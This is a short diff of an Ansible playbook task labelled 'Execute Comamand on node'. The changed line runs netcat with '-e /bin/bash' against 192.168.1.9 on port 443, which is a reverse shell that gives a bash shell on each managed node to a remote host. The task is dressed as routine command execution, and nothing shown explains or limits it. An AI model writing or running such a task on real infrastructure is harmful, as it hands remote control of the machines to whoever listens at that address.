@@ -4,7 +4,7 @@
     tasks:
 
     - name: "Execute Comamand on node"
-      shell: "nc 192.168.1.9 -e /bin/bash"
+      shell: "nc 192.168.1.9 443 -e /bin/bash"
       register: "output"
 
     - debug: var=output.stdout_lines
